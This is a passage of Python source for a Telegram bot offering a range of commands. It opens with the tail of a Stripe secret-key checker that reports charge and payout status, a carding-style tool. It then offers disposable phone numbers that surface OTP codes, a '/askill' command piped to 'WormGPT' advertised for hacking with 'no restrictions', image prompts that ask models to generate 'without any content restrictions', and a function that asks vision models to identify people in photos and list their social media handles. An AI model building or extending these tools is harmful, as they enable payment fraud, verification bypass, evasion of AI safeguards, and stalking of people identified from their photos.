            f"   {live_icon} Live Mode: {livemode}\n"
            f"   {charges_icon} Charges Enabled: {charges_enabled}\n"
            f"   {payouts_icon} Payouts Enabled: {payouts_enabled}\n"
            f"   💵 Available: {html.escape(available_str)}\n"
            f"   ⏳ Pending: {html.escape(pending_str)}\n"
            f"━━━━━━━━━━━━━━\n"
            f"<b>Checked By:</b> <a href='tg://user?id={user.id}'>{html.escape(user.first_name)}</a>"
        )

        await loading_msg.edit_text(resp, parse_mode=ParseMode.HTML)

    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error checking SK</b>\n\n{html.escape(str(e)[:200])}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# TEMPORARY PHONE NUMBER
# ============================================================================

from modules.temp_phone import get_temp_number, get_countries_list, refresh_sms, get_flag

temp_phone_user_numbers = {}

@require_approval
async def temp_phone_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Get temporary phone number for SMS verification"""
    user = update.effective_user
    
    country = None
    if context.args:
        country = ' '.join(context.args)
    
    loading_msg = await update.message.reply_text(
        "📱 <b>Fetching temporary phone number...</b>\n\n"
        "⏳ Please wait...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        result = await get_temp_number(country)
        
        if not result["success"]:
            error_msg = result.get("error", "Unknown error")
            if "available_countries" in result:
                countries = result["available_countries"][:15]
                countries_text = ", ".join(countries)
                error_msg += f"\n\n<b>Available countries:</b>\n{countries_text}..."
            
            await loading_msg.edit_text(
                f"❌ <b>Failed to get number</b>\n\n{error_msg}",
                parse_mode=ParseMode.HTML
            )
            return
        
        number = result["number"]
        country_name = result["country"]
        flag = get_flag(country_name)
        messages = result["messages"]
        last_update = result.get("last_update", "Unknown")
        
        temp_phone_user_numbers[user.id] = {
            "number": number,
            "country_code": result.get("country_code", "")
        }
        
        msg_text = f"""📱 <b>Temporary Phone Number</b>

{flag} <b>Country:</b> {country_name}
📞 <b>Number:</b> <code>{number}</code>
🕐 <b>Last Activity:</b> {last_update}

<i>Use this number for SMS verification. Messages will appear below.</i>

"""
        
        if messages:
            msg_text += f"📨 <b>Recent Messages ({len(messages)}):</b>\n\n"
            for i, sms in enumerate(messages[:5], 1):
                sender = sms.get("FromNumber", "Unknown")
                body = sms.get("Messagebody", "")[:150]
                time = sms.get("message_time", "")
                codes = sms.get("codes", [])
                msg_text += f"<b>{i}. From:</b> {sender}\n"
                msg_text += f"<b>Message:</b> {body}\n"
                if codes:
                    msg_text += f"🔑 <b>OTP:</b> <code>{', '.join(codes)}</code>\n"
                msg_text += f"<b>Time:</b> {time}\n\n"
        else:
            msg_text += "📭 <i>No messages yet. Waiting for SMS...</i>\n"
        
        keyboard = [
            [_btn("Refresh Messages", style="success", icon=EID["regenerate"], callback_data=f"tpno_refresh_{number}")],
            [_btn("Get New Number", icon=EID["bolt"], callback_data="tpno_new")],
            [_btn("Choose Country", style="default", icon=EID["search"], callback_data="tpno_countries")]
        ]
        
        await loading_msg.edit_text(
            msg_text,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

async def temp_phone_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle temp phone callbacks"""
    query = update.callback_query
    await query.answer()
    user = query.from_user
    data = query.data
    
    if data.startswith("tpno_refresh_"):
        number = data.replace("tpno_refresh_", "")
        
        await query.edit_message_text(
            "🔄 <b>Refreshing messages...</b>",
            parse_mode=ParseMode.HTML
        )
        
        try:
            user_data = temp_phone_user_numbers.get(user.id, {})
            country_code = user_data.get("country_code", "") if isinstance(user_data, dict) else ""
            messages = await refresh_sms(country_code, number)
            
            msg_text = f"""📱 <b>Messages for {number}</b>

"""
            if messages:
                msg_text += f"📨 <b>Messages ({len(messages)}):</b>\n\n"
                for i, sms in enumerate(messages[:8], 1):
                    sender = sms.get("FromNumber", "Unknown")
                    body = sms.get("Messagebody", "")[:150]
                    time = sms.get("message_time", "")
                    codes = sms.get("codes", [])
                    msg_text += f"<b>{i}. From:</b> {sender}\n"
                    msg_text += f"<b>Message:</b> {body}\n"
                    if codes:
                        msg_text += f"🔑 <b>OTP:</b> <code>{', '.join(codes)}</code>\n"
                    msg_text += f"<b>Time:</b> {time}\n\n"
            else:
                msg_text += "📭 <i>No messages yet. Keep waiting...</i>\n"
            
            keyboard = [
                [_btn("Refresh Again", style="success", icon=EID["regenerate"], callback_data=f"tpno_refresh_{number}")],
                [_btn("Get New Number", icon=EID["bolt"], callback_data="tpno_new")]
            ]
            
            await query.edit_message_text(
                msg_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)
    
    elif data == "tpno_new":
        await query.edit_message_text(
            "📱 <b>Getting new number...</b>",
            parse_mode=ParseMode.HTML
        )
        
        try:
            result = await get_temp_number()
            
            if result["success"]:
                number = result["number"]
                country_name = result["country"]
                flag = get_flag(country_name)
                
                temp_phone_user_numbers[user.id] = number
                
                msg_text = f"""📱 <b>New Temporary Number</b>

{flag} <b>Country:</b> {country_name}
📞 <b>Number:</b> <code>{number}</code>

📭 <i>No messages yet. Waiting for SMS...</i>
"""
                keyboard = [
                    [_btn("Refresh Messages", style="success", icon=EID["regenerate"], callback_data=f"tpno_refresh_{number}")],
                    [_btn("Get Another", icon=EID["bolt"], callback_data="tpno_new")]
                ]
                
                await query.edit_message_text(
                    msg_text,
                    parse_mode=ParseMode.HTML,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            else:
                await query.edit_message_text(f"❌ {result.get('error', 'Failed')}", parse_mode=ParseMode.HTML)
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)
    
    elif data == "tpno_countries":
        try:
            countries = await get_countries_list()
            
            msg_text = "🌍 <b>Available Countries</b>\n\n"
            for c in countries[:30]:
                msg_text += f"{c['flag']} {c['name']}\n"
            
            msg_text += "\n<b>Usage:</b> <code>/tpno usa</code> or <code>/tpno india</code>"
            
            keyboard = [[_btn("BACK", style="default", icon=EID["back"], callback_data="tpno_new")]]
            
            await query.edit_message_text(
                msg_text,
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
        except Exception as e:
            await query.edit_message_text(f"❌ Error: {str(e)[:100]}", parse_mode=ParseMode.HTML)

# ============================================================================
# AI CHAT - /ask COMMAND
# ============================================================================

@require_approval
async def ask_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask AI anything using OpenRouter free models"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🤖 <b>AI Assistant</b>\n\n"
            "<b>Usage:</b> <code>/ask your question here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/ask What is Bitcoin?</code>\n"
            "• <code>/ask Explain quantum computing</code>\n"
            "• <code>/ask Write a Python hello world</code>",
            parse_mode=ParseMode.HTML
        )
        return
    
    question = ' '.join(context.args)
    
    if len(question) > 2000:
        await update.message.reply_text(ae("❌ Question too long. Max 2000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🤖 <b>AI is thinking...</b>\n\n"
        "⏳ Please wait...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        result = await ask_ai(question, user.id)
        
        if result["success"]:
            answer = sanitize_ai_response(result["answer"])
            model = result.get("model", "AI")
            
            if len(answer) > 4000:
                answer = answer[:4000] + "...\n\n<i>(Response truncated)</i>"
            
            safe_question = html_escape(question[:100])
            response_text = f"""🤖 <b>AI Response</b>

<b>Question:</b> {safe_question}{'...' if len(question) > 100 else ''}

<b>Answer:</b>
{answer}

<i>Powered by {model}</i>"""
            
            await loading_msg.edit_text(
                response_text,
                parse_mode=ParseMode.HTML
            )
        else:
            error = result.get("error", "Unknown error")
            await loading_msg.edit_text(
                f"❌ <b>AI Error</b>\n\n{error}",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

@require_approval
async def askill_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Ask WormGPT AI - uncensored AI model"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔥 <b>WormGPT - Uncensored AI</b>\n\n"
            "<b>Usage:</b> <code>/askill your question here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/askill How to code a bot?</code>\n"
            "• <code>/askill Explain hacking techniques</code>\n"
            "• <code>/askill Write a script for me</code>\n\n"
            "<i>No restrictions. No censorship.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    question = ' '.join(context.args)
    
    if len(question) > 2000:
        await update.message.reply_text(ae("❌ Question too long. Max 2000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🔥 <b>WormGPT is thinking...</b>\n\n"
        "⏳ Please wait...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        result = await ask_wormgpt(question, user.id)
        
        if result["success"]:
            answer = sanitize_ai_response(result["answer"])
            model = result.get("model", "WormGPT")
            
            if len(answer) > 4000:
                answer = answer[:4000] + "...\n\n<i>(Response truncated)</i>"
            
            safe_question = html_escape(question[:100])
            response_text = f"""🔥 <b>WormGPT Response</b>

<b>Question:</b> {safe_question}{'...' if len(question) > 100 else ''}

<b>Answer:</b>
{answer}

<i>Powered by {model} - No Limits</i>"""
            
            await loading_msg.edit_text(
                response_text,
                parse_mode=ParseMode.HTML
            )
        else:
            error = result.get("error", "Unknown error")
            await loading_msg.edit_text(
                f"❌ <b>WormGPT Error</b>\n\n{error}",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# IMAGE GENERATION - /img COMMAND
# ============================================================================

OPENROUTER_IMAGE_MODELS = [
    "openai/dall-e-3",
    "stabilityai/stable-diffusion-3",
    "black-forest-labs/flux-1-schnell",
]

UNCENSORED_IMAGE_MODELS = [
    "black-forest-labs/flux-1-schnell",
    "stabilityai/stable-diffusion-xl-base-1.0",
]

@require_approval
async def img_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate images using OpenRouter API"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🎨 <b>AI Image Generator</b>\n\n"
            "<b>Usage:</b> <code>/img your prompt here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/img cute anime girl with blue hair</code>\n"
            "• <code>/img cyberpunk city at night</code>\n"
            "• <code>/img beautiful sunset over mountains</code>\n\n"
            "💡 <i>Be descriptive for better results!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 1000:
        await update.message.reply_text(ae("❌ Prompt too long. Max 1000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🎨 <b>Generating image...</b>\n\n"
        f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
        "⏳ Please wait (10-30 seconds)...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        openrouter_key = os.environ.get('OPENROUTER_API_KEY', '')
        
        if not openrouter_key:
            await loading_msg.edit_text(
                "❌ <b>Error:</b> OpenRouter API key not configured.",
                parse_mode=ParseMode.HTML
            )
            return
        
        headers = {
            "Authorization": f"Bearer {openrouter_key}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://replit.com",
            "X-Title": "Onichan Bot"
        }
        
        image_url = None
        used_model = None
        
        async with aiohttp.ClientSession() as session:
            # Try image generation models
            for model in OPENROUTER_IMAGE_MODELS:
                try:
                    payload = {
                        "model": model,
                        "messages": [
                            {
                                "role": "user",
                                "content": f"Generate an image: {prompt}"
                            }
                        ]
                    }
                    
                    async with session.post(
                        "https://openrouter.ai/api/v1/chat/completions",
                        headers=headers,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=60)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            # Check for image in response
                            if "choices" in data and len(data["choices"]) > 0:
                                content = data["choices"][0].get("message", {}).get("content", "")
                                
                                # Extract image URL from markdown or direct URL
                                import re
                                url_match = re.search(r'https?://[^\s\)\"]+(?:\.png|\.jpg|\.jpeg|\.webp)', content)
                                if url_match:
                                    image_url = url_match.group(0)
                                    used_model = model
                                    break
                                
                                # Check for base64 image
                                if "data:image" in content or "base64" in content:
                                    # Handle base64 separately
                                    pass
                            
                except Exception as model_error:
                    print(f"[IMG] Model {model} failed: {model_error}")
                    continue
            
            # Fallback: Use text-to-image via Pollinations (free backup)
            if not image_url:
                import urllib.parse
                encoded_prompt = urllib.parse.quote(prompt)
                image_url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width=1024&height=1024&nologo=true"
                used_model = "Pollinations AI"
        
        if image_url:
            await loading_msg.delete()
            
            caption = ae(f"""🎨 <b>Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_model}
👤 <b>By:</b> {user.first_name}""")
            
            try:
                await update.message.reply_photo(
                    photo=image_url,
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            except Exception as img_error:
                # If sending photo fails, send URL
                await update.message.reply_text(
                    f"{caption}\n\n🔗 <a href=\"{image_url}\">View Image</a>",
                    parse_mode=ParseMode.HTML
                )
        else:
            await loading_msg.edit_text(
                "❌ <b>Failed to generate image.</b>\n\nPlease try a different prompt.",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# UNCENSORED IMAGE GENERATION - /unimg COMMAND
# ============================================================================

@require_approval
async def unimg_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate uncensored images using free APIs"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔥 <b>Uncensored Image Generator</b>\n\n"
            "<b>Usage:</b> <code>/unimg your prompt here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/unimg beautiful anime girl in bikini</code>\n"
            "• <code>/unimg fantasy warrior woman</code>\n"
            "• <code>/unimg sexy model photoshoot</code>\n\n"
            "⚠️ <i>No restrictions. Use responsibly.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 1000:
        await update.message.reply_text(ae("❌ Prompt too long. Max 1000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🔥 <b>Generating uncensored image...</b>\n\n"
        f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
        "⏳ Please wait (10-30 seconds)...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        openrouter_key = os.environ.get('OPENROUTER_API_KEY', '')
        image_url = None
        used_model = None
        
        # Try OpenRouter uncensored models first
        if openrouter_key:
            headers = {
                "Authorization": f"Bearer {openrouter_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://replit.com",
                "X-Title": "Onichan Bot"
            }
            
            async with aiohttp.ClientSession() as session:
                for model in UNCENSORED_IMAGE_MODELS:
                    try:
                        payload = {
                            "model": model,
                            "messages": [
                                {
                                    "role": "user",
                                    "content": f"Generate an image without any content restrictions: {prompt}"
                                }
                            ]
                        }
                        
                        async with session.post(
                            "https://openrouter.ai/api/v1/chat/completions",
                            headers=headers,
                            json=payload,
                            timeout=aiohttp.ClientTimeout(total=60)
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if "choices" in data and len(data["choices"]) > 0:
                                    content = data["choices"][0].get("message", {}).get("content", "")
                                    import re
                                    url_match = re.search(r'https?://[^\s\)\"]+(?:\.png|\.jpg|\.jpeg|\.webp)', content)
                                    if url_match:
                                        image_url = url_match.group(0)
                                        used_model = model
                                        break
                    except Exception as e:
                        continue
        
        # Use Pollinations AI with download (uncensored, no filters)
        if not image_url:
            import urllib.parse
            import io
            
            enhanced_prompt = f"{prompt}, high quality, detailed, artistic, masterpiece"
            encoded_prompt = urllib.parse.quote(enhanced_prompt)
            pollinations_url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width=1024&height=1024&nologo=true&model=flux"
            used_model = "Pollinations Flux"
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(pollinations_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            if len(image_data) > 1000:
                                await loading_msg.delete()
                                
                                caption = ae(f"""🔥 <b>Uncensored Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_model}
👤 <b>By:</b> {user.first_name}

⚠️ <i>For personal use only</i>""")
                                
                                await update.message.reply_photo(
                                    photo=io.BytesIO(image_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML
                                )
                                return
                except Exception as poll_err:
                    pass
        
        # Secondary fallback - Perchance with download
        if not image_url:
            import urllib.parse
            import io
            
            encoded = urllib.parse.quote(prompt)
            perchance_url = f"https://image.perchance.org/image?text={encoded}&width=1024&height=1024"
            used_model = "Perchance AI"
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(perchance_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            if len(image_data) > 1000:
                                await loading_msg.delete()
                                
                                caption = ae(f"""🔥 <b>Uncensored Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_model}
👤 <b>By:</b> {user.first_name}

⚠️ <i>For personal use only</i>""")
                                
                                await update.message.reply_photo(
                                    photo=io.BytesIO(image_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML
                                )
                                return
                except Exception as perch_err:
                    pass
        
        await loading_msg.edit_text(
            "❌ <b>Failed to generate image.</b>\n\nPlease try again or use a different prompt.",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# BLACKBOX AI IMAGE GENERATION - /randi COMMAND
# ============================================================================

@require_approval
async def randi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate images using Blackbox AI API with Pollinations fallback"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🖤 <b>Blackbox AI Image Generator</b>\n\n"
            "<b>Usage:</b> <code>/randi your prompt here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/randi beautiful sunset over mountains</code>\n"
            "• <code>/randi anime girl with blue hair</code>\n"
            "• <code>/randi cyberpunk city at night</code>\n\n"
            "⏳ <i>Generation takes 10-30 seconds</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 1000:
        await update.message.reply_text(ae("❌ Prompt too long. Max 1000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🖤 <b>Generating image...</b>\n\n"
        f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
        "⏳ Please wait (10-30 seconds)...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        import io
        import urllib.parse
        
        async with aiohttp.ClientSession() as session:
            # Use Pollinations AI (reliable, no API key needed, uncensored)
            enhanced_prompt = f"{prompt}, high quality, detailed, 8k, masterpiece"
            encoded_prompt = urllib.parse.quote(enhanced_prompt)
            pollinations_url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width=1024&height=1024&nologo=true&model=flux"
            
            try:
                async with session.get(pollinations_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if len(image_data) > 1000:
                            await loading_msg.delete()
                            
                            caption = f"""🖤 <b>Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> Flux AI (Uncensored)
👤 <b>By:</b> {user.first_name}"""
                            
                            await update.message.reply_photo(
                                photo=io.BytesIO(image_data),
                                caption=caption,
                                parse_mode=ParseMode.HTML
                            )
                            return
            except Exception as poll_err:
                pass
            
            # Fallback to Perchance
            try:
                encoded = urllib.parse.quote(prompt)
                perchance_url = f"https://image.perchance.org/image?text={encoded}&width=1024&height=1024"
                
                async with session.get(perchance_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if len(image_data) > 1000:
                            await loading_msg.delete()
                            
                            caption = f"""🖤 <b>Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> Perchance AI
👤 <b>By:</b> {user.first_name}"""
                            
                            await update.message.reply_photo(
                                photo=io.BytesIO(image_data),
                                caption=caption,
                                parse_mode=ParseMode.HTML
                            )
                            return
            except Exception as perch_err:
                pass
        
        await loading_msg.edit_text(
            "❌ <b>Failed to generate image.</b>\n\nPlease try again with a different prompt.",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# AI MUSIC GENERATION - /music COMMAND
# ============================================================================

@require_approval
async def music_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate music using AI APIs"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🎵 <b>AI Music Generator</b>\n\n"
            "⚠️ <b>Note:</b> Free music AI is slow (1-3 min)\n\n"
            "<b>Usage:</b> <code>/music lofi beats</code>\n\n"
            "<b>Tips for faster results:</b>\n"
            "• Keep prompts SHORT (2-4 words)\n"
            "• Simple genres work best\n\n"
            "🎧 <i>Uses Meta's MusicGen AI</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 500:
        await update.message.reply_text(ae("❌ Prompt too long. Max 500 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🎵 <b>Generating music...</b>\n\n"
        f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
        "⏳ Please wait 1-3 minutes...\n"
        "🎧 Loading AI model and composing...\n\n"
        "<i>Free AI is slow. First request may take longer.</i>",
        parse_mode=ParseMode.HTML
    )
    
    try:
        import io
        
        async with aiohttp.ClientSession() as session:
            # Try Hugging Face MusicGen API (free, public inference)
            try:
                hf_url = "https://api-inference.huggingface.co/models/facebook/musicgen-small"
                headers = {
                    "Content-Type": "application/json"
                }
                payload = {"inputs": prompt, "wait_for_model": True}
                
                async with session.post(
                    hf_url,
                    headers=headers,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as resp:
                    if resp.status == 200:
                        content_type = resp.headers.get('content-type', '')
                        if 'audio' in content_type or 'octet-stream' in content_type:
                            audio_data = await resp.read()
                            if len(audio_data) > 5000:
                                await loading_msg.delete()
                                
                                caption = f"""🎵 <b>Music Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> MusicGen (Meta AI)
👤 <b>By:</b> {user.first_name}

🎧 <i>Enjoy your AI-generated music!</i>"""
                                
                                await update.message.reply_audio(
                                    audio=io.BytesIO(audio_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML,
                                    filename=f"music_{user.id}.flac",
                                    title=prompt[:50]
                                )
                                return
                    elif resp.status == 503:
                        # Model loading, wait and retry
                        await loading_msg.edit_text(
                            "🎵 <b>Loading AI model...</b>\n\n"
                            "⏳ First request takes longer. Please wait...",
                            parse_mode=ParseMode.HTML
                        )
                        await asyncio.sleep(20)
                        
                        async with session.post(
                            hf_url,
                            headers=headers,
                            json=payload,
                            timeout=aiohttp.ClientTimeout(total=180)
                        ) as retry_resp:
                            if retry_resp.status == 200:
                                audio_data = await retry_resp.read()
                                if len(audio_data) > 5000:
                                    await loading_msg.delete()
                                    
                                    caption = f"""🎵 <b>Music Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> MusicGen (Meta AI)
👤 <b>By:</b> {user.first_name}

🎧 <i>Enjoy your AI-generated music!</i>"""
                                    
                                    await update.message.reply_audio(
                                        audio=io.BytesIO(audio_data),
                                        caption=caption,
                                        parse_mode=ParseMode.HTML,
                                        filename=f"music_{user.id}.flac",
                                        title=prompt[:50]
                                    )
                                    return
            except asyncio.TimeoutError:
                pass
            except Exception as hf_err:
                pass
            
            audio_url = None
            used_api = None
            
            # If we got a URL, download and send
            if audio_url:
                try:
                    async with session.get(audio_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                        if resp.status == 200:
                            audio_data = await resp.read()
                            if len(audio_data) > 1000:
                                await loading_msg.delete()
                                
                                import io
                                caption = f"""🎵 <b>Music Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_api}
👤 <b>By:</b> {user.first_name}

🎧 <i>Enjoy your AI-generated music!</i>"""
                                
                                await update.message.reply_audio(
                                    audio=io.BytesIO(audio_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML,
                                    filename=f"music_{user.id}.mp3",
                                    title=prompt[:50]
                                )
                                return
                except Exception as dl_err:
                    pass
        
        # All APIs failed
        await loading_msg.edit_text(
            "❌ <b>Music generation temporarily unavailable.</b>\n\n"
            "The AI model is currently loading or busy.\n\n"
            "<b>Try:</b>\n"
            "• Wait 30 seconds and try again\n"
            "• Use shorter prompts: <code>lofi beats</code>\n"
            "• Try: <code>jazz piano</code>, <code>electronic</code>",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# REVERSE IMAGE SEARCH - /revrs
# ============================================================================

GEMINI_VISION_MODELS = [
    "gemini-2.0-flash",
    "gemini-2.0-flash-lite", 
    "gemini-1.5-flash",
    "gemini-1.5-flash-8b"
]

OPENROUTER_VISION_MODELS = [
    "meta-llama/llama-4-maverick:free",
    "qwen/qwen2.5-vl-72b-instruct:free",
    "mistralai/mistral-small-3.1-24b-instruct:free"
]

async def identify_person_from_image(image_data: bytes, mime_type: str = "image/jpeg") -> dict:
    """Use AI Vision to identify person - tries Gemini then OpenRouter"""
    import base64
    
    gemini_key = os.environ.get('GEMINI_API_KEY', '')
    openrouter_key = os.environ.get('OPENROUTER_API_KEY', '')
    
    if not gemini_key and not openrouter_key:
        return {"success": False, "error": "No API key configured"}
    
    if not image_data:
        return {"success": False, "error": "No image data provided"}
    
    image_base64 = base64.b64encode(image_data).decode('utf-8')
    
    prompt = """Analyze this image and identify the person(s) in it.
If you recognize who they are, provide:

👤 Name: [Full name]
💼 Role: [Profession/Who they are]
📱 Social Media:
   • Twitter/X: @handle
   • Instagram: @handle
   • Other platforms if known

📝 Brief description of the person.

If you cannot identify the specific person, describe what you see in the image.
Be concise and direct."""

    last_error = None
    
    # Try Gemini first
    if gemini_key:
        try:
            payload = {
                "contents": [{
                    "parts": [
                        {"text": prompt},
                        {"inline_data": {"mime_type": mime_type, "data": image_base64}}
                    ]
                }],
                "generationConfig": {"temperature": 0.2, "maxOutputTokens": 1000}
            }
            
            async with aiohttp.ClientSession() as session:
                for model in GEMINI_VISION_MODELS:
                    try:
                        url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={gemini_key}"
                        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if 'candidates' in data and data['candidates']:
                                    text = data['candidates'][0].get('content', {}).get('parts', [{}])[0].get('text', '')
                                    if text:
                                        return {"success": True, "identification": text}
                            elif resp.status == 429:
                                continue
                            else:
                                continue
                    except:
                        continue
        except:
            pass
    
    # Fallback to OpenRouter vision models
    if openrouter_key:
        try:
            headers = {
                "Authorization": f"Bearer {openrouter_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://t.me/onichanbot"
            }
            
            async with aiohttp.ClientSession() as session:
                for model in OPENROUTER_VISION_MODELS:
                    try:
                        payload = {
                            "model": model,
                            "messages": [{
                                "role": "user",
                                "content": [
                                    {"type": "text", "text": prompt},
                                    {"type": "image_url", "image_url": {"url": f"data:{mime_type};base64,{image_base64}"}}
                                ]
                            }],
                            "max_tokens": 1000
                        }
                        
                        async with session.post(
                            "https://openrouter.ai/api/v1/chat/completions",
                            headers=headers, json=payload,
                            timeout=aiohttp.ClientTimeout(total=60)
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if 'choices' in data and data['choices']:
                                    text = data['choices'][0].get('message', {}).get('content', '')
                                    if text:
                                        return {"success": True, "identification": text}
                            elif resp.status == 429:
                                continue
                    except:
                        continue
        except:
            pass
    
    return {"success": False, "error": "All AI models are busy. Please try again in a minute."}

async def reverse_image_search(image_url: str) -> dict:
    """Perform reverse image search using multiple free engines"""
    results = {
        "google_lens": None,
        "yandex": None,
        "tineye": None,
        "similar_images": [],
        "possible_sources": [],
        "face_matches": []
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            # TinEye API (free tier)
            try:
